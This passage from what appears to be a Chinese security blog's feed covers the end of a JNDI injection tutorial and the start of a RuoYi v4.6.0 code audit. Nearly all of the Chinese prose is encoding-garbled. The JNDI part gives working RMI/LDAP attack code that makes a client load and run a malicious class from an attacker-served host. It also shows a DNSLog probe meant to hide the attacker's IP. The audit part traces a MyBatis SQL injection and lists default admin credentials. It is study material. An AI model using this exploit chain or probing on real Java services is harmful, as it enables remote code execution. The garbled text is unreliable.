id="å¯åŠ¨æœåŠ¡-1"><a href="#å¯åŠ¨æœåŠ¡-1" class="headerlink" title="å¯åŠ¨æœåŠ¡"></a>å¯åŠ¨æœåŠ¡</h4><p>1ã€å°† HTTP ç«¯æ¶æ„è½½è· Calculator.javaï¼Œç¼–è¯‘æˆ Calculator.class æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306150412917.png" data-caption="image-20230306150412917"><img src="/../images/Java/jndi/image-20230306150412917.png" alt="image-20230306150412917"></a></p><p>2ã€åœ¨ Calculator.class ç›®å½•ä¸‹åˆ©ç”¨ Python èµ·ä¸€ä¸ªä¸´æ—¶çš„ WEB æœåŠ¡æ”¾ç½®æ¶æ„è½½è·,è¿™é‡Œçš„ç«¯å£å¿…é¡»è¦ä¸ LDAPServer.java çš„ Reference é‡Œé¢çš„é“¾æ¥ç«¯å£ä¸€è‡´</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306150454319.png" data-caption="image-20230306150454319"><img src="/../images/Java/jndi/image-20230306150454319.png" alt="image-20230306150454319"></a></p><p>python3 -m http.server 8081</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306153210903.png" data-caption="image-20230306153210903"><img src="/../images/Java/jndi/image-20230306153210903.png" alt="image-20230306153210903"></a></p><p>3ã€IDEA å°†æ¼æ´ç¯å¢ƒå¯åŠ¨èµ·æ¥å¹¶å®ç°å¼¹çª—ï¼Œé¡ºåºä¸ºå…ˆå…¶æœåŠ¡ç«¯ï¼Œå†èµ·å®¢æˆ·ç«¯</p><p>æœåŠ¡ç«¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306153341210.png" data-caption="image-20230306153341210"><img src="/../images/Java/jndi/image-20230306153341210.png" alt="image-20230306153341210"></a></p><p>å†ç‚¹å‡»è¿è¡Œå®¢æˆ·ç«¯ï¼Œå®ç°å¼¹çª—</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306153414342.png" data-caption="image-20230306153414342"><img src="/../images/Java/jndi/image-20230306153414342.png" alt="image-20230306153414342"></a></p><br/><h3 id="DNSåè®®"><a href="#DNSåè®®" class="headerlink" title="DNSåè®®"></a>DNSåè®®</h3><p>é€šè¿‡ä¸Šé¢æˆ‘ä»¬å¯çŸ¥ <code>JNDI</code> æ³¨å…¥å¯ä»¥åˆ©ç”¨ <code>RMI</code> åè®®å’Œ<code> LDAP</code> åè®®æ­å»ºæœåŠ¡ç„¶åæ‰§è¡Œå‘½ä»¤ï¼Œä½†æœ‰ä¸ªä¸å¥½çš„ç‚¹å°±æ˜¯ä¼šæš´éœ²è‡ªå·±çš„æœåŠ¡å™¨ <code>IP</code>  ã€‚åœ¨æ²¡æœ‰ç¡®å®šå­˜åœ¨æ¼æ´å‰ï¼Œç›´æ¥åœ¨ç›´æ¥æœåŠ¡å™¨ä¸Šä½¿ç”¨ <code>RMI</code> æˆ–è€… <code>LDAP</code> å»æ‰§è¡Œå‘½ä»¤ï¼Œé€šè¿‡æ—¥å¿—å¯åˆ†æå¾—åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ <code>IP</code>ï¼Œè¿™æ ·åœ¨æ²¡æœ‰è·å–æˆæœçš„å‰æä¸‹è¿˜æš´éœ²äº†è‡ªå·±çš„æœåŠ¡å™¨ <code>IP</code>ï¼Œå¾—ä¸å¿å¤±ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>DNS</code> åè®®è¿›è¡Œæ¢æµ‹ï¼Œé€šè¿‡ <code>DNS</code> åè®®å»æ¢æµ‹æ˜¯å¦çœŸçš„å­˜åœ¨æ¼æ´ï¼Œå†å»åˆ©ç”¨ <code>RMI</code> æˆ–è€… <code>LDAP</code> å»æ‰§è¡Œå‘½ä»¤ï¼Œé¿å…è¿‡æ—©æš´éœ²æœåŠ¡å™¨ <code>IP</code>ï¼Œè¿™ä¹Ÿæ˜¯å¹³å¸¸å¤§å¤šæ•°äººä¹ æƒ¯ä½¿ç”¨ <code>DNSLog</code> æ¢æµ‹çš„åŸå› ä¹‹ä¸€ï¼ŒåŒæ ·çš„ <code>ldap</code> å’Œ <code>rmi</code> ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>DNSLog</code> å¹³å°å»æ¢æµ‹ã€‚</p><h4 id="ç¯å¢ƒæ­å»º-2"><a href="#ç¯å¢ƒæ­å»º-2" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p>ä½¿ç”¨ä¸Šé¢ä»»ä¸€ç¯å¢ƒå³å¯ï¼Œåªéœ€è¦å®¢æˆ·ç«¯ï¼Œä¸éœ€è¦æœåŠ¡å™¨å»èµ·å…¶å®ƒåè®®æœåŠ¡ã€‚</p><p>æ¼æ´ç«¯ä»£ç </p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_ldap_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://lwwj38.dnslog.cn&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><h4 id="å¯åŠ¨æœåŠ¡-2"><a href="#å¯åŠ¨æœåŠ¡-2" class="headerlink" title="å¯åŠ¨æœåŠ¡"></a>å¯åŠ¨æœåŠ¡</h4><p>å¡«å…¥ <code>DNSLog</code> å¹³å°åŸŸåï¼Œæˆ–è‡ªå·±æ­å»ºçš„å¹³å°åŸŸåï¼Œæ‰§è¡Œç¨‹åº</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230310143511868.png" data-caption="image-20230310143511868"><img src="/../images/Java/jndi/image-20230310143511868.png" alt="image-20230310143511868"></a></p><p><code>DNSLog</code> å¹³å°è¿”å›è®°å½•ï¼Œè¯æ˜æ¼æ´å­˜åœ¨</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230310143532724.png" data-caption="image-20230310143532724"><img src="/../images/Java/jndi/image-20230310143532724.png" alt="image-20230310143532724"></a></p><h2 id="äº”ã€æ‰©å±•"><a href="#äº”ã€æ‰©å±•" class="headerlink" title="äº”ã€æ‰©å±•"></a>äº”ã€æ‰©å±•</h2><h3 id="InitialContextç±»"><a href="#InitialContextç±»" class="headerlink" title="InitialContextç±»"></a>InitialContextç±»</h3><p>ç”± <code>JNDI+RMI</code> æ¼æ´ä»£ç è¿›è¡Œåˆ†æ</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:7778/RCE&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>InitialContext</code> ç±»ç”¨äºè¯»å– JNDI çš„ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œå†…å«å¯¹è±¡å’Œå…¶åœ¨ JNDI ä¸­çš„æ³¨å†Œåç§°çš„æ˜ å°„ä¿¡æ¯</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(); <span class="comment">// åˆå§‹åŒ–ä¸Šä¸‹æ–‡,è·å–åˆå§‹ç›®å½•ç¯å¢ƒçš„ä¸€ä¸ªå¼•ç”¨</span></span><br></pre></td></tr></table></figure></div><p><code>lookup(String name)</code>  è·å– name çš„æ•°æ®ï¼Œè¿™é‡Œçš„ uri è¢«å®šä¹‰ä¸º <code>rmi://127.0.0.1:7778/RCE</code> æ‰€ä»¥ä¼šé€šè¿‡ <code>rmi</code> åè®®è®¿é—® <code>127.0.0.1:7778/RCE</code></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:7778/RCE&quot;</span>;</span><br><span class="line">initialContext.lookup(uri); <span class="comment">//åˆ©ç”¨lookup() å‡½æ•°è·å–æŒ‡å®šçš„è¿œç¨‹å¯¹è±¡</span></span><br></pre></td></tr></table></figure></div><p>ç”±äº <code>lookup()</code> å‚æ•°å¯æ§ï¼Œå¯¼è‡´æ¼æ´çš„å‡ºç°ï¼Œè·Ÿè¿›ä»£ç å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306165352111.png" data-caption="image-20230306165352111"><img src="/../images/Java/jndi/image-20230306165352111.png" alt="image-20230306165352111"></a></p><br/><h3 id="Reference-ç±»"><a href="#Reference-ç±»" class="headerlink" title="Reference ç±»"></a>Reference ç±»</h3><p>Reference æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ¯ä¸ª Reference éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘çš„å¯¹è±¡ï¼Œå¯¹è±¡æŒ‡å®šç±»ä¼šè¢«åŠ è½½å¹¶å®ä¾‹åŒ–ã€‚</p><p>ç”± <code>JNDI+RMI</code> æœåŠ¡ç«¯æ”»å‡»ä»£ç </p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">7778</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;RCE&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>reference æŒ‡å®šäº†ä¸€ä¸ª Calculator ç±»ï¼Œäºè¿œç¨‹çš„ <code>http://127.0.0.1:8081/</code> æœåŠ¡ç«¯ä¸Šï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„è°ƒç”¨å¹¶å®ä¾‹åŒ–æ‰§è¡Œã€‚</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306174535684.png" data-caption="image-20230306174535684"><img src="/../images/Java/jndi/image-20230306174535684.png" alt="image-20230306174535684"></a></p><h2 id="å…­ã€æ€»ç»“"><a href="#å…­ã€æ€»ç»“" class="headerlink" title="å…­ã€æ€»ç»“"></a>å…­ã€æ€»ç»“</h2><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œå½’çº³æ€»ç»“ä¸ºç”±äº <code>lookup()</code> çš„å‚æ•°å¯æ§ï¼Œæ”»å‡»è€…åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ„é€ æ¶æ„çš„ <code>Reference</code> ç±»ç»‘å®šåœ¨ <code>RMIServer</code> çš„ <code>Registry</code> é‡Œé¢ï¼Œç„¶åå®¢æˆ·ç«¯è°ƒç”¨ <code>lookup()</code> å‡½æ•°é‡Œé¢çš„å¯¹è±¡ï¼Œè¿œç¨‹ç±»è·å–åˆ° <code>Reference</code> å¯¹è±¡ï¼Œå®¢æˆ·ç«¯æ¥æ”¶ <code>Reference</code> å¯¹è±¡åï¼Œå¯»æ‰¾ <code>Reference</code> ä¸­æŒ‡å®šçš„ç±»ï¼Œè‹¥æŸ¥æ‰¾ä¸åˆ°ï¼Œåˆ™ä¼šåœ¨ <code>Reference</code> ä¸­æŒ‡å®šçš„è¿œç¨‹åœ°å€å»è¿›è¡Œè¯·æ±‚ï¼Œè¯·æ±‚åˆ°è¿œç¨‹çš„ç±»åä¼šåœ¨æœ¬åœ°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œè¾¾åˆ° <code>JNDI</code> æ³¨å…¥æ”»å‡»ã€‚</p><h2 id="ä¸ƒã€å‚è€ƒæ–‡ç« "><a href="#ä¸ƒã€å‚è€ƒæ–‡ç« " class="headerlink" title="ä¸ƒã€å‚è€ƒæ–‡ç« "></a>ä¸ƒã€å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.javasec.org/javase/JNDI/</span><br><span class="line">https://docs.oracle.com/javase/tutorial/jndi/overview/</span><br><span class="line">https://xz.aliyun.com/t/6633</span><br><span class="line">https://www.cnblogs.com/nice0e3/p/13958047.html</span><br><span class="line">https://blog.csdn.net/qq_38626043/article/details/129256939</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNDI </tag>
            
            <tag> RMI </tag>
            
            <tag> LDAP </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡(å…­)-è‹¥ä¾ç®¡ç†ç³»ç»ŸV4.6.0</title>
      <link href="/2023/03/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AD)-%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV4-6-0/"/>
      <url>/2023/03/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AD)-%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV4-6-0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>è‹¥ä¾ç®¡ç†ç³»ç»Ÿæ˜¯åŸºäº SpringBoot å¼€å‘çš„è½»é‡çº§ JAVA å¼€å‘æ¡†æ¶ï¼Œï¼Œæœ¬ç¯‡æ–‡ç« åŸºäº V4.6.0 ç‰ˆæœ¬çš„åŸºç¡€ä¸Šå¯¹éƒ¨åˆ†å†å²æ¼æ´è¿›è¡Œå®¡è®¡åˆ†æã€‚é¡¹ç›®åœ°å€ï¼š<a href="https://gitee.com/y_project/RuoYi/tree/v4.6.0">https://gitee.com/y_project/RuoYi/tree/v4.6.0</a></p><h2 id="äºŒã€ç¯å¢ƒæ­å»º"><a href="#äºŒã€ç¯å¢ƒæ­å»º" class="headerlink" title="äºŒã€ç¯å¢ƒæ­å»º"></a>äºŒã€ç¯å¢ƒæ­å»º</h2><p>è¿™é‡Œä¾ç„¶ä½¿ç”¨ Phpstudy ä½œä¸ºæ•°æ®åº“æºï¼Œåˆ©ç”¨ navicat å¯¼å…¥æ•°æ®è¡¨</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128193032129.png" data-caption="image-20221128193032129"><img src="/../images/Java/ruoyi/image-20221128193032129.png" alt="image-20221128193032129"></a></p><p>åˆ›å»ºæ•°æ®åº“</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128193140018.png" data-caption="image-20221128193140018"><img src="/../images/Java/ruoyi/image-20221128193140018.png" alt="image-20221128193140018"></a></p><p>å¯¼å…¥æ•°æ®è¡¨</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128193247668.png" data-caption="image-20221128193247668"><img src="/../images/Java/ruoyi/image-20221128193247668.png" alt="image-20221128193247668"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128193314048.png" data-caption="image-20221128193314048"><img src="/../images/Java/ruoyi/image-20221128193314048.png" alt="image-20221128193314048"></a></p><p>IDEAå¯¼å…¥é¡¹ç›®æºç ï¼Œæ³¨æ„æºç è·¯å¾„ä¸è¦æœ‰ä¸­æ–‡ï¼Œç­‰å¾… Maven ä¸‹è½½é¡¹ç›®ä¾èµ–</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128194601780.png" data-caption="image-20221128194601780"><img src="/../images/Java/ruoyi/image-20221128194601780.png" alt="image-20221128194601780"></a></p><p>æˆ‘è¿™è¾¹ä¿®æ”¹äº†å‡ å¤„ï¼Œä¸€ä¸ºæ•°æ®åº“è´¦å·å¯†ç åŠæ•°æ®åº“åç§°ï¼ˆ<strong>æ³¨æ„ï¼šä¿®æ”¹ä¸ºè‡ªå·±çš„æœ¬åœ°æ•°æ®åº“è´¦å·å¯†ç </strong>ï¼‰ï¼ŒäºŒæ˜¯å°†é¡¹ç›®ç«¯å£ 80 æ”¹ä¸º 8888 ï¼Œè·¯å¾„æ”¹ä¸ºäº†æœ¬æœºèƒ½è®¿é—®çš„è·¯å¾„ï¼Œå› ä¸ºæœ¬äººç¯å¢ƒæ˜¯è™šæ‹Ÿæœºï¼Œæ²¡æœ‰è®¾ç½®Dç›˜</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128202414458.png" data-caption="image-20221128202414458"><img src="/../images/Java/ruoyi/image-20221128202414458.png" alt="image-20221128202414458"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128201751385.png" data-caption="image-20221128201751385"><img src="/../images/Java/ruoyi/image-20221128201751385.png" alt="image-20221128201751385"></a></p><p>ä¿®æ”¹å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128202005935.png" data-caption="image-20221128202005935"><img src="/../images/Java/ruoyi/image-20221128202005935.png" alt="image-20221128202005935"></a></p><p>ç‚¹å‡»è¿è¡Œé¡¹ç›®ï¼Œè®¿é—® <a href="http://localhost:8888/login">http://localhost:8888/login</a> æˆåŠŸæ­å»ºï¼Œé»˜è®¤è´¦å·ä¸º <code>admin/admin123</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128202131048.png" data-caption="image-20221128202131048"><img src="/../images/Java/ruoyi/image-20221128202131048.png" alt="image-20221128202131048"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128202451155.png" data-caption="image-20221128202451155"><img src="/../images/Java/ruoyi/image-20221128202451155.png" alt="image-20221128202451155"></a></p><h2 id="ä¸‰ã€ä»£ç å®¡è®¡"><a href="#ä¸‰ã€ä»£ç å®¡è®¡" class="headerlink" title="ä¸‰ã€ä»£ç å®¡è®¡"></a>ä¸‰ã€ä»£ç å®¡è®¡</h2><h3 id="1ã€pom-xml-å®¡è®¡"><a href="#1ã€pom-xml-å®¡è®¡" class="headerlink" title="1ã€pom.xml å®¡è®¡"></a>1ã€pom.xml å®¡è®¡</h3><p>è€å¥—è·¯ï¼Œå­˜åœ¨ pom.xmlï¼Œå…ˆå®¡è®¡å…¶ä½¿ç”¨äº†å“ªäº›æ¡†æ¶ï¼Œæ¡†æ¶ç»„ä»¶æ˜¯å¦å­˜åœ¨å†å²æ¼æ´ã€‚è¿™ä¸ªä¸ä»¥å¾€çš„é¡¹ç›®ä¸ä¸€æ ·çš„æ˜¯ï¼Œç³»ç»Ÿå­˜åœ¨å¤šä¸ª pom.xmlï¼Œæˆ‘ä»¬åªéœ€è¦å®¡è®¡æœ€å¤–å±‚çš„ pom.xml å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128212237103.png" data-caption="image-20221128212237103"><img src="/../images/Java/ruoyi/image-20221128212237103.png" alt="image-20221128212237103"></a></p><p>ç¬¬ä¸‰æ–¹ç»„ä»¶å¦‚ä¸‹ï¼Œè¿™ä¸€ç¯‡ç¬”è€…ä¸æ‰“ç®—å±•å¼€ç»„ä»¶æ¼æ´çš„å®¡è®¡ï¼Œå¯è‡ªè¡Œæ ¹æ®ç‰ˆæœ¬ç½‘ä¸Š search å¤ç°</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">| ç»„ä»¶åç§°           | ç»„ä»¶ç‰ˆæœ¬ |</span><br><span class="line">| ------------------ | -------- |</span><br><span class="line">| shiro              | 1.7.0    |</span><br><span class="line">| thymeleaf          | 2.0.0    |</span><br><span class="line">| druid              | 1.2.2    |</span><br><span class="line">| bitwalker          | 1.21     |</span><br><span class="line">| kaptcha            | 2.3.2    |</span><br><span class="line">| swagger            | 2.9.2    |</span><br><span class="line">| pagehelper         | 1.3.0    |</span><br><span class="line">| fastjson           | 1.2.74   |</span><br><span class="line">| oshi               | 5.3.6    |</span><br><span class="line">| jna                | 5.6.0    |</span><br><span class="line">| commons.io         | 2.5      |</span><br><span class="line">| commons.fileupload | 1.3.3    |</span><br><span class="line">| poi                | 4.1.2    |</span><br><span class="line">| velocity           | 1.7      |</span><br></pre></td></tr></table></figure></div><br/><h3 id="2ã€æ¼æ´å®¡è®¡"><a href="#2ã€æ¼æ´å®¡è®¡" class="headerlink" title="2ã€æ¼æ´å®¡è®¡"></a>2ã€æ¼æ´å®¡è®¡</h3><h4 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a><strong>SQLæ³¨å…¥</strong></h4><p>SpringBootä¸­ ä½¿ç”¨äº† Mybatis çš„ SQL æ³¨å…¥ä¸€èˆ¬éƒ½æ˜¯å› ä¸ºä½¿ç”¨äº† $ ï¼Œæ‰€ä»¥å…¨å±€æœç´¢ .xml çš„ <code>$&#123;</code>ã€‚ï¼ˆæ³¨ï¼šæœç´¢.xmlæ–‡ä»¶çš„åŸå› æ˜¯è¯¥ç³»ç»Ÿä½¿ç”¨äº† Mybatis ä¸­çš„<code>é…ç½®æ–‡ä»¶å¼€å‘-ã€‹ç¼–å†™ xml é…ç½®æ–‡ä»¶æ¥æ˜ å°„ç›¸åº”çš„ä»£ç </code>ï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129125159545.png" data-caption="image-20221129125159545"><img src="/../images/Java/ruoyi/image-20221129125159545.png" alt="image-20221129125159545"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129125130419.png" data-caption="image-20221129125130419"><img src="/../images/Java/ruoyi/image-20221129125130419.png" alt="image-20221129125130419"></a></p><p>è¿™è¾¹å…ˆå¯¹ç¬¬ä¸€ä¸ªå¯ç–‘ç‚¹è¿›è¡Œå®¡è®¡ <code>$&#123;params.dataScope&#125;</code></p><p>å› ä¸ºè¯¥é¡¹ç›®ä½¿ç”¨äº† <code>mybatis</code> å¹¶ä¸”åˆ©ç”¨äº†é…ç½®æ–‡ä»¶å¼€å‘ï¼Œæ‰€ä»¥ä¼šåœ¨ <code>resource</code> ç›®å½•ä¸‹å‡ºç°æ˜ å°„çš„ <code>.xml</code> é…ç½®æ–‡ä»¶ã€‚æˆ‘ä»¬åœ¨ <code>SysRoleMapper.xml</code> æ–‡ä»¶ä¸­æ‰¾åˆ°äº†å¯ç–‘å‚æ•° <code>$&#123;params.dataScope&#125;</code>ï¼Œå¹¶å®šä½åˆ°æ˜ å°„è¯­å¥ <code>id=selectRolelist</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129131526187.png" data-caption="image-20221129131526187"><img src="/../images/Java/ruoyi/image-20221129131526187.png" alt="image-20221129131526187"></a></p><p>é€šè¿‡ä¸Šé¢æˆ‘ä»¬å®šä½åˆ°æ–‡ä»¶ <code>resources</code> ç›®å½•ä¸‹çš„ <code>SysRoleMapper.xml</code> é…ç½®æ–‡ä»¶ä¸­çš„æ˜ å°„è¯­å¥ <code>id=selectRolelist</code>ï¼Œæ ¹æ®ä»¥å¾€æ–‡ç« çš„å­¦ä¹ å·²çŸ¥ <code>resources</code> å±‚å¯¹åº” <code>dao</code> å±‚çš„æ¥å£ï¼Œæ–‡ä»¶åä¹Ÿä¸€è‡´ï¼Œæ‰€ä»¥æˆ‘ä»¬å®šä½åˆ° <code>dao</code> å±‚çš„ <code>SysRoleMapper.java</code> ï¼Œæ‰¾åˆ° <code>selectRolelist</code> æ¥å£</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129132412165.png" data-caption="image-20221129132412165"><img src="/../images/Java/ruoyi/image-20221129132412165.png" alt="image-20221129132412165"></a></p><p>ç„¶å <code>Ctrl + é¼ æ ‡å·¦é”®</code> è·Ÿè¿› <code>selectRolelist</code> æ¥å£ï¼Œçœ‹æ˜¯è°è°ƒç”¨è¿™ä¸ªæ¥å£ã€‚æˆ‘ä»¬æ¥åˆ°äº† <code>service</code> å±‚çš„å®ä½“ç±» <code>SysRoleServiceImpl.java</code> æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129132823022.png" data-caption="image-20221129132823022"><img src="/../images/Java/ruoyi/image-20221129132823022.png" alt="image-20221129132823022"></a></p><p>ç„¶åæˆ‘ä»¬å°†å…‰æ ‡æ”¾åˆ° <code>selectRoleList</code> æ–¹æ³•å¤„ï¼Œå¿«æ·é”® <code>Ctrl + u</code> 